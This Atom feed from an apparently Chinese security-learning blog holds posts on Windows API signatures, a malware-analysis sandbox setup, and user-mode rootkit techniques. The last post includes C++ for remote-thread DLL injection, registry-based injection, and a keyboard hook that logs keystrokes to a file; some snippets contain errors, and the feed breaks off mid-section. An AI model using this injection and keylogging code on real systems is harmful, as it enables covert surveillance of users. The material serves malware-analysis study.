<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>findream&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-02-12T15:22:52.434Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>findream</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Windows API 函数</title>
    <link href="http://yoursite.com/2018/02/10/Windows_API_%E5%87%BD%E6%95%B0/"/>
    <id>http://yoursite.com/2018/02/10/Windows_API_函数/</id>
    <published>2018-02-10T07:45:11.000Z</published>
    <updated>2018-02-12T15:22:52.434Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess()"></a>CreateProcess()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>创建一个新的进程及其主线程。新进程在调用进程的安全上下文中运行。</strong><br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">BOOL WINAPI CreateProcess（</div><div class="line">  <span class="variable">_In_opt_</span> LPCTSTR lpApplicationName，  <span class="comment">//要执行的模块的名称。这个模块可以是基于Windows的应用程序</span></div><div class="line">  <span class="variable">_Inout_opt_</span> LPTSTR lpCommandLine，</div><div class="line">  <span class="variable">_In_opt_</span> LPSECURITY_ATTRIBUTES lpProcessAttributes， <span class="comment">//指向安全令牌的指针</span></div><div class="line">  <span class="variable">_In_opt_</span> LPSECURITY_ATTRIBUTES lpThreadAttributes，  <span class="comment">//指向SECURITY_ATTRIBUTES结构的指针， 用于确定是否可以由子进程继承返回的新线程对象的句柄。</span></div><div class="line">  <span class="variable">_In_</span> BOOL bInheritHandles，</div><div class="line">  <span class="variable">_In_</span> DWORD dwCreationFlags，</div><div class="line">  <span class="variable">_In_opt_</span> LPVOID lpEnvironment，</div><div class="line">  <span class="variable">_In_opt_</span> LPCTSTR lpCurrentDirectory，               <span class="comment">//进程当前目录的完整路径。该字符串也可以指定一个UNC路径</span></div><div class="line">  <span class="variable">_In_</span> LPSTARTUPINFO lpStartupInfo，</div><div class="line">  <span class="variable">_Out_</span> LPPROCESS_INFORMATION lpProcessInformation</div><div class="line">）;</div></pre></td></tr></table></figure></p><h2 id="返回值：函数成功返回进程句柄，失败返回NULL。"><a href="#返回值：函数成功返回进程句柄，失败返回NULL。" class="headerlink" title="返回值：函数成功返回进程句柄，失败返回NULL。"></a>返回值：函数成功返回进程句柄，失败返回NULL。</h2><h2 id="PeekNamedPipe"><a href="#PeekNamedPipe" class="headerlink" title="PeekNamedPipe()"></a>PeekNamedPipe()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>将自已命名或匿名管道的数据复制到缓冲区中。</strong><br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">BOOL WINAPI PeekNamedPipe（</div><div class="line">  <span class="variable">_HANDLE</span> hNamedPipe，  <span class="comment">//管道的句柄。此参数可以是由CreateNamedPipe或 CreateFile函数返回的命名管道实例的句柄 ，也可以是由CreatePipe函数返回的匿名管道读取端的句柄 。该句柄必须具有对管道的GENERIC_READ访问权限。</span></div><div class="line">  <span class="variable">_Out_opt_</span> LPVOID lpBuffer，<span class="comment">//指向缓冲区的指针，用于接收从管道读取的数据。</span></div><div class="line">  <span class="variable">_In_</span> DWORD nBufferSize，</div><div class="line">  <span class="variable">_Out_opt_</span> LPDWORD lpBytesRead，</div><div class="line">  <span class="variable">_Out_opt_</span> LPDWORD lpTotalBytesAvail，</div><div class="line">  <span class="variable">_Out_opt_</span> LPDWORD lpBytesLeftThisMessage</div><div class="line">）;</div></pre></td></tr></table></figure></p><h2 id="如果函数成功，返回值是非零的。调用失败返回NULL。"><a href="#如果函数成功，返回值是非零的。调用失败返回NULL。" class="headerlink" title="如果函数成功，返回值是非零的。调用失败返回NULL。"></a>如果函数成功，返回值是非零的。调用失败返回NULL。</h2><h2 id="TerminateThread"><a href="#TerminateThread" class="headerlink" title="TerminateThread()"></a>TerminateThread()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>终止一个线程</strong><br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">BOOL WINAPI TerminateThread（</div><div class="line">  <span class="variable">_Inout_</span> HANDLE hThread，</div><div class="line">  <span class="variable">_In_</span> DWORD dwExitCode  <span class="comment">//退出代码</span></div><div class="line">）;</div></pre></td></tr></table></figure></p><h2 id="如果函数成功，返回值是非零的。调用失败返回0。"><a href="#如果函数成功，返回值是非零的。调用失败返回0。" class="headerlink" title="如果函数成功，返回值是非零的。调用失败返回0。"></a>如果函数成功，返回值是非零的。调用失败返回0。</h2><h2 id="InternetOpenUrl"><a href="#InternetOpenUrl" class="headerlink" title="InternetOpenUrl()"></a>InternetOpenUrl()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;打开由完整的FTP或HTTP URL指定的资源。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">HINTERNET InternetOpenUrl（</div><div class="line">  <span class="variable">_In_</span> HINTERNET hInternet，  <span class="comment">//InternetOpen返回的句柄</span></div><div class="line">  <span class="variable">_In_</span> LPCTSTR lpszUrl，      <span class="comment">//URL</span></div><div class="line">  <span class="variable">_In_</span> LPCTSTR lpszHeaders，</div><div class="line">  <span class="variable">_In_</span> DWORD dwHeadersLength，</div><div class="line">  <span class="variable">_In_</span> DWORD dwFlags，        <span class="comment">//flag</span></div><div class="line">  <span class="variable">_In_</span> DWORD_PTR dwContext</div><div class="line">）;</div></pre></td></tr></table></figure></p><h2 id="如果连接成功建立，则返回URL的有效句柄-如果连接失败，则返回NULL。"><a href="#如果连接成功建立，则返回URL的有效句柄-如果连接失败，则返回NULL。" class="headerlink" title="如果连接成功建立，则返回URL的有效句柄; 如果连接失败，则返回NULL。"></a>如果连接成功建立，则返回URL的有效句柄; 如果连接失败，则返回NULL。</h2><h2 id="InternetOpen"><a href="#InternetOpen" class="headerlink" title="InternetOpen()"></a>InternetOpen()</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>初始化应用程序对WinINet函数的使用。只关注与InternetOpenUrl的区别</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CreateProcess&quot;&gt;&lt;a href=&quot;#CreateProcess&quot; class=&quot;headerlink&quot; title=&quot;CreateProcess()&quot;&gt;&lt;/a&gt;CreateProcess()&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbs
      
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>搭建inetsim虚拟分析网络</title>
    <link href="http://yoursite.com/2018/02/10/%E6%90%AD%E5%BB%BAinetsim%E8%99%9A%E6%8B%9F%E5%88%86%E6%9E%90%E7%BD%91%E7%BB%9C/"/>
    <id>http://yoursite.com/2018/02/10/搭建inetsim虚拟分析网络/</id>
    <published>2018-02-09T16:15:11.000Z</published>
    <updated>2018-02-09T16:47:54.526Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>马上要看恶意代码分析实战第十四讲了，想到之前留了一个坑—搭建inetsim虚拟分析网络，我们分析病毒的时候不能把我们的分析机暴露与正常的互联网中，这样很容易使我们沦落为黑客抓取的肉鸡，也有可能病毒透过虚拟机共享的网络，感染同一网络下的其他机器。但是，我们也不能不给虚拟机连上网络，因为许多病毒感染首先会检测openInternet，如果处于断网状态，病毒可能不会有感染行为。所以我们分析病毒的时候需要搭建一个虚拟网络平台，进行正常的病毒分析。</strong><a id="more"></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>参考文献：<a href="https://www.52pojie.cn/thread-330528-1-1.html" target="_blank" rel="external">https://www.52pojie.cn/thread-330528-1-1.html</a></strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，我们需要两台虚拟机，一台是配置我们的Inetsim的Kali，Inetsim是虚拟网络组件，用于在实验室环境下模拟各种网络环境。拥有各种网络协议。另外一台是我们的分析机。此外还需有ApateDNS,用于把某些软件（如恶意软件）的DNS响应欺骗到指定的主机上。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置虚拟机硬件网络。添加一个新的网络适配器VMnet3，类型设置为仅主机模式。子网ip和子网掩码随意。如图：<br>    <img src="https://i.imgur.com/upudLn6.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用ifconfig查看kali的ip，如图所示，安装inetsim(kali自带)，然后配置inetsim，修改<strong>#service_bind_address 10.10.10.1</strong>为<strong>service_bind_address xxx.xxx.xxx.xxx（kali本机ip）</strong><br>    <img src="https://i.imgur.com/sYrNcPE.png" alt=""><br>    <img src="https://i.imgur.com/fePW9xs.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修改DNS，设置为手动获取，<strong>首选DNS地址设置为回环地址，备用地址设置为Kali本机ip。</strong><br>    <img src="https://i.imgur.com/Q18MkWS.png" alt=""></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;打开ApateDns，利用ApateDns去欺骗DNS响应到我们的Kali服务器。<br>    <img src="https://i.imgur.com/Co3RpYs.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;strong&gt;马上要看恶意代码分析实战第十四讲了，想到之前留了一个坑—搭建inetsim虚拟分析网络，我们分析病毒的时候不能把我们的分析机暴露与正常的互联网中，这样很容易使我们沦落为黑客抓取的肉鸡，也有可能病毒透过虚拟机共享的网络，感染同一网络下的其他机器。但是，我们也不能不给虚拟机连上网络，因为许多病毒感染首先会检测openInternet，如果处于断网状态，病毒可能不会有感染行为。所以我们分析病毒的时候需要搭建一个虚拟网络平台，进行正常的病毒分析。&lt;/strong&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>用户态下的Rootkit进程隐藏技术</title>
    <link href="http://yoursite.com/2018/02/07/%E7%94%A8%E6%88%B7%E6%80%81%E4%B8%8B%E7%9A%84RootKit%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/"/>
    <id>http://yoursite.com/2018/02/07/用户态下的RootKit进程隐藏技术/</id>
    <published>2018-02-07T09:20:11.000Z</published>
    <updated>2018-02-16T05:57:23.629Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一部分：Rootkit技术"><a href="#第一部分：Rootkit技术" class="headerlink" title="第一部分：Rootkit技术"></a>第一部分：Rootkit技术</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Rootkit被计算机病毒广泛适用于躲避杀毒软件的查杀，RootKit技术也叫进程隐藏技术，掌握这项技术，这是一个“优秀”的病毒编写者应该具备的能力。同样的，对于病毒分析者来说，识别这种技术也是必须具备的。Rootkit技术主要有4种方法，分别是DLL注入，代码注入，HOOK技术，APC注入技术。这些技术都是把恶意代码注入到进程（线程）中，一般用procexp能看到。<br><a id="more"></a></p><h1 id="第二部分：DLL注入"><a href="#第二部分：DLL注入" class="headerlink" title="第二部分：DLL注入"></a>第二部分：DLL注入</h1><h2 id="DLL注入的第一种方法：CreateRemoteThread远程线程调用"><a href="#DLL注入的第一种方法：CreateRemoteThread远程线程调用" class="headerlink" title="DLL注入的第一种方法：CreateRemoteThread远程线程调用"></a>DLL注入的第一种方法：CreateRemoteThread远程线程调用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DLL注入是指向某一个特定的进程空间强制插入一个特定的DLL文件映像，值得注意的是这种插入是强制性的插入，从技术层面来看，<strong>DLL注入是利用LoadLibrary（）加载特定的DLL文件到进程的内存空间。</strong>注入的对象是可以是自身，也可以是远程进程。DLL注入技术实现主要分为5个部分，</p><ul><li><strong>第一步打开进程，获取进程的句柄，</strong></li><li><strong>第二歩是在内存空间开辟一段内存空间</strong></li><li><strong>第三步是向刚刚开辟的内存中写入需要注入DLL的路径，</strong></li><li><strong>第四步是利用GetProcessAddree()获取LoadLibrary的地址。</strong></li><li><p><strong>第五步是调用远程线程，利用LoadLibrary（）去加载DLL。</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">InjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDLLPath)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">HANDLE hProcess = <span class="literal">NULL</span>,hThread=<span class="literal">NULL</span>;</div><div class="line">DWORD BufSize = (DWORD)(_tcslen(szDLLPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(TCHAR);</div><div class="line"><span class="comment">/*-------------打开需要注入的进程-------------*/</span></div><div class="line"><span class="keyword">if</span> (!OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"OpenProcess(%d) Open Fail:[%d]"</span>, dwPID, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">/*------------向目标进程开辟内存空间-----------*/</span></div><div class="line">LPVOID pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, BufSize, MEM_COMMIT, PAGE_READWRITE);</div><div class="line"><span class="comment">/*------------将目标路径写入进程---------------*/</span></div><div class="line">WriteProcessMenory(hProcess, pRemoteBuf, (LPVOID)szDLLPath, BufSize, <span class="literal">NULL</span>);</div><div class="line"><span class="comment">/*-----------获取LoadLibrary地址--------------*/</span></div><div class="line">HMODULE hMod = GetModuleHandle(<span class="string">L"kenerl32.dll"</span>);</div><div class="line">pThreadProc = GetAddress(hMod, <span class="string">"LoadLibrary"</span>);</div><div class="line"><span class="comment">/*------------调用远程线程加载DLL--------------*/</span></div><div class="line">hThread = CreateRemoteThread(hProcess,</div><div class="line"><span class="literal">NULL</span>,</div><div class="line"><span class="number">0</span>,</div><div class="line">pThreadProc,  <span class="comment">//远程线程LaodLibrary</span></div><div class="line">pRemoteBuf,   <span class="comment">//参数，DLL的路径</span></div><div class="line"><span class="number">0</span>,</div><div class="line"><span class="literal">NULL</span>);</div><div class="line">CloseHandle(hProcess);</div><div class="line">CloseHandle(hThread);</div><div class="line"><span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>反编译如下：</p><ul><li>打开进程<br><img src="https://i.imgur.com/2A2LMkZ.png" alt=""></li><li>设置进程内存空间<br><img src="https://i.imgur.com/V80hqpw.png" alt=""></li><li>调用CreateRemoteThread实现注入<br><img src="https://i.imgur.com/dMceeeT.png" alt=""></li></ul></li></ul><h2 id="DLL注入的第二种方法：利用注册表注入"><a href="#DLL注入的第二种方法：利用注册表注入" class="headerlink" title="DLL注入的第二种方法：利用注册表注入"></a>DLL注入的第二种方法：利用注册表注入</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用APPiNIT_dll注册表来实现DLL注入。因为windows允许只要加载了USER32.dll的进程并且，某一个dll的绝对路径处于注册表<strong>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion \Windows\AppInit_DLLs</strong>中，os就会自动去加载位于该注册表的有效的DLL。所以只需要在注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion \Windows\AppInit_DLLs中添加DLL的绝对路径，并把数值改为1，可以使得所有加载USER32.dll的进程全部加载目标路径的DLL。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用AppCertDlls注册表，将<strong>HKLM\System\CurrentControlSet\Control\Session Manager\AppCertDlls</strong>下写入dll的路径，可以将此注册表项下的DLL加载到调用CreateProcess，CreateProcessAsUser，CreateProcessWithLogonW，CreateProcessWithTokenW和WinExec的每个进程中。<strong>值得注意的是win xp-win 10 默认不存在这个注册表项</strong></p><h2 id="DLL注入的第三种方法：SetWindowsHookEx-设置钩子"><a href="#DLL注入的第三种方法：SetWindowsHookEx-设置钩子" class="headerlink" title="DLL注入的第三种方法：SetWindowsHookEx()设置钩子"></a>DLL注入的第三种方法：SetWindowsHookEx()设置钩子</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用windows的消息机制，可以在事件发送到os之间设置一条钩链，来钩取不同的消息，如以下代码，利用SetwindowsHookEx可以钩取一个键盘消息。并且调用钩子处理函数来处理这个消息，所达到的效果和dll注入是一样的（执行dll内部的代码）<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> _declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HookStart</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">g_hHook = SetWindowsHookEx(WH_KEYBOARD, HookProc, GetModuleHandle(TEXT(<span class="string">"消息钩取(DLL注入）实验.dll"</span>)), <span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (g_hHook == <span class="literal">NULL</span>)</div><div class="line">MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">"安装钩子失败"</span>), TEXT(<span class="string">"提示"</span>), MB_OKCANCEL);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;钩子函数要使用回调函数，这样可以重复钩取消息<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line">LRESULT CALLBACK HookProc(int ncode, WPARAM wParam, LPARAM lParam)</div><div class="line">&#123;</div><div class="line">FILE *fp;   <span class="comment">//做文件的写入工作</span></div><div class="line">TCHAR <span class="type">key</span>[<span class="number">20</span>];</div><div class="line">const TCHAR *k = NULL;</div><div class="line">TCHAR *p = NULL;</div><div class="line">if (ncode &gt;= <span class="number">0</span>)  <span class="comment">//ncode 大于等于0，操作有效</span></div><div class="line">&#123;</div><div class="line">if (!(lParam &amp; <span class="number">0x80000000</span>))<span class="comment">//出现按键消息</span></div><div class="line">&#123;</div><div class="line">GetKeyNameText(lParam,<span class="type">key</span>,<span class="number">20</span>);<span class="comment">//检索键名的字符串</span></div><div class="line">int <span class="section">state</span> = GetKeyState(VK_CAPITAL);<span class="comment">//指定大小写的状态，返回值是1或者0</span></div><div class="line">int asyncState = GetAsyncKeyState(VK_SHIFT);<span class="comment">//指定函数调用时候</span></div><div class="line">if (lstrlen(<span class="type">key</span>) == <span class="number">1</span>)  <span class="comment">//只出现一个按键</span></div><div class="line">&#123;</div><div class="line">if (asyncState &lt; <span class="number">0</span>)  <span class="comment">//未上档</span></div><div class="line">&#123;</div><div class="line">for (int i = <span class="number">0</span>; i &lt; <span class="number">22</span>; i++)</div><div class="line">&#123;</div><div class="line">if (KeyUn[i] == <span class="type">key</span>[<span class="number">0</span>])</div><div class="line">&#123;</div><div class="line"><span class="type">key</span>[<span class="number">0</span>] = KeyUn[i];</div><div class="line">break;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">if (k == NULL&amp;&amp;<span class="section">state</span> &gt; <span class="number">0</span>)  <span class="comment">//小写状态</span></div><div class="line">&#123;</div><div class="line">if (wParam &gt;= <span class="number">65</span> &amp;&amp; wParam &lt;= <span class="number">90</span>)</div><div class="line"><span class="type">key</span>[<span class="number">0</span>] += <span class="number">32</span>;   <span class="comment">//转化为ASCII小写</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">else  <span class="comment">//小写状态</span></div><div class="line">&#123;</div><div class="line">if (k == NULL&amp;&amp;<span class="section">state</span> == <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">if (wParam &gt;= <span class="number">65</span> &amp;&amp; wParam &lt;= <span class="number">90</span>)</div><div class="line"><span class="type">key</span>[<span class="number">0</span>] += <span class="number">32</span>;   <span class="comment">//转化为小写</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">k = &amp;<span class="type">key</span>[<span class="number">0</span>];         <span class="comment">//k指向缓冲区的地址</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">else if (lstrlen(<span class="type">key</span>) == <span class="number">5</span>)</div><div class="line">&#123;</div><div class="line">if (<span class="type">key</span>[<span class="number">0</span>] == TEXT('N') &amp;&amp; <span class="type">key</span>[<span class="number">1</span>] == TEXT('u') &amp;&amp; <span class="type">key</span>[<span class="number">2</span>] == TEXT('m') &amp;&amp; <span class="type">key</span>[<span class="number">3</span>] == TEXT(' '))</div><div class="line">k = &amp;<span class="type">key</span>[<span class="number">4</span>];</div><div class="line">&#125;</div><div class="line">if (k != NULL)</div><div class="line">&#123;</div><div class="line">lstrcat(str,k);</div><div class="line"><span class="comment">//FlushBuffer();</span></div><div class="line"><span class="comment">/*HANDLE hf = CreateFile(TEXT("C:/数据.txt"), GENERIC_READ | GENERIC_WRITE,</span></div><div class="line"><span class="comment">0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);    </span></div><div class="line"><span class="comment">if (!GetProcessId(NULL))</span></div><div class="line"><span class="comment">ErrorExit(TEXT("GetProcessId"));</span></div><div class="line"><span class="comment">DWORD written;</span></div><div class="line"><span class="comment">WriteFile(hf, str, sizeof(str), &amp;written, 0);</span></div><div class="line"><span class="comment">CloseHandle(hf);*/</span></div><div class="line">fp = fopen(<span class="string">"E:/学习/C语言/Viusal Studio/消息钩取（DLL注入）实验--注入工具（GUI）/消息钩取（DLL注入）实验--注入工具（GUI）/抓取的数据.txt"</span>, <span class="string">"wt"</span>);</div><div class="line"><span class="comment">//fprintf(fp, "%s", str);</span></div><div class="line"><span class="comment">//fwrite(str,sizeof(str),1,fp)</span></div><div class="line">if(fwrite(str, sizeof(str), <span class="number">1</span>, fp)!=<span class="number">1</span>)</div><div class="line">MessageBox(NULL, TEXT(<span class="string">"文件写入失败"</span>), TEXT(<span class="string">"提示"</span>), MB_OKCANCEL);</div><div class="line">fclose(fp);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="comment">//如果没有找到notepad的进程，将消息传递给下一个钩子</span></div><div class="line">return CallNextHookEx(g_hHook, ncode, wParam, lParam);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h1 id="第三部分：代码注入"><a href="#第三部分：代码注入" class="headerlink" title="第三部分：代码注入"></a>第三部分：代码注入</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;代码注入是一种向进程中插入一段独立运行的代码并且不会影响进程的运行（如崩溃）的技术，从技术上讲他也是调用CreateRemoteThread（）来注入远程代码。分两次向进程中注入，第一次以远程线程的形式注入，第二次以线程参数的形式注入远程进程。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">DWORD WINAPI ThreadProc()</div><div class="line">&#123;</div><div class="line"><span class="comment">//需要注入的代码</span></div><div class="line">&#125;</div><div class="line">BOOL InjectCode(DWORD pId)</div><div class="line">&#123;</div><div class="line">PHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="literal">FALSE</span>, dwPID));</div><div class="line">dwsize = sizeof(THREADPARAM);   <span class="comment">//插入代码所需要数据的大小</span></div><div class="line">pRemoteBuf[<span class="number">0</span>] = VirtualAllocEx();   <span class="comment">//在进程空间开辟一个数据大小相同的空间</span></div><div class="line">WriteProcessMenory(hProcess, pRemoteBuf[<span class="number">0</span>], &amp;param, dwsize, NULL);<span class="comment">//将注入代码所需要的数据写入进程空间</span></div><div class="line">dwsize = (dword)InjectCode() - (dword)ThreadProc();<span class="comment">//插入代码需要的空间大小</span></div><div class="line">pRemoteBuf[<span class="number">0</span>] = VirtualAllocEx();    <span class="comment">//在进程中开辟等大小的空间用于存储代码</span></div><div class="line">WriteProcessMenory(hProcess, pRemoteBuf[<span class="number">0</span>], (LPVOID)ThreadProc(), dwsize, NULL);</div><div class="line">hTread = CreateRemoteThread(hProcess, </div><div class="line">                        NULL,</div><div class="line">                        <span class="number">0</span>,</div><div class="line">                        pRemoteBuf[<span class="number">1</span>], <span class="comment">//注入的代码</span></div><div class="line">                        pRemoteBuf[<span class="number">0</span>], <span class="comment">//代码所需要的数据作为代码的参数传入</span></div><div class="line">                        <span class="number">0</span>, NULL);</div><div class="line">CloseHandle(hProcess);</div><div class="line">CloseHandle(hThread);</div><div class="line">&#125;</div></pre></td></tr></table></figure><ul><li>反编译如下：<ul><li>复制代码所需数据<br><img src="https://i.imgur.com/9Kf0jWt.png" alt=""></li><li>打开目标进程：<br><img src="https://i.imgur.com/7IDTGAu.png" alt=""></li><li>开辟内存空间，为了存储数据<br><img src="https://i.imgur.com/ZX9hrXY.png" alt=""></li><li>写入数据<br><img src="https://i.imgur.com/LRBY0f0.png" alt=""></li><li>开辟进程空间，为了存储代码<br><img src="https://i.imgur.com/1Seh6VN.png" alt=""></li><li>写入代码<br><img src="https://i.imgur.com/0AQ7mt3.png" alt=""></li><li>调用CreateRemoteThread()进行代码注入<br><img src="https://i.imgur.com/ee8mYv8.png" alt=""></li></ul></li></ul><h1 id="第四部分：HOOK技术"><a href="#第四部分：HOOK技术" class="headerlink" title="第四部分：HOOK技术"></a>第四部分：HOOK技术</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HOOK叫做钩取(钩子)，他的原理是：windows系统分为用户态和内核态，在用户态中需要访问一些敏感的数据（网络，文件资源等）就必须要调用windowsAPI函数，来与kernel沟通获得该资源的使用权。钩子便可以这是在调用API函数的时候，在调用之前（IAT_HOOK）或者之后发挥作用，这样恶意软件便不需要创建一个进程就可以实现某些恶意的功能。便达到了隐藏自身的作用。</p><h2 id="1-IAT-HOOK技术【复杂且不友好】"><a href="#1-IAT-HOOK技术【复杂且不友好】" class="headerlink" 